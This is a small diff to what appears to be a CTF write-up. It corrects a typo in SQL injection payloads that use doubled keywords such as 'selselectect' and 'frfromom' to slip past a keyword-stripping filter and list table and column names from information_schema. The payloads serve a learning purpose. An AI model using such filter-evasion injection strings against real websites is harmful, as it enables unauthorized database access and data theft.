@@ -122,7 +122,7 @@ if($v1 && $v2){
 
 ```mysql
 # 表名:flag,id,user
-id=-1' union selselectect group_concat(table_name) frfromom infoorrmation_schema.tables where table_shema=database()
+id=-1' union selselectect group_concat(table_name) frfromom infoorrmation_schema.tables where table_schema=database()
 
 # 列名:flag
 id=-1' union selselectect group_concat(column_name) frfromom infoorrmation_schema.columns where table_name = 'flag'%23
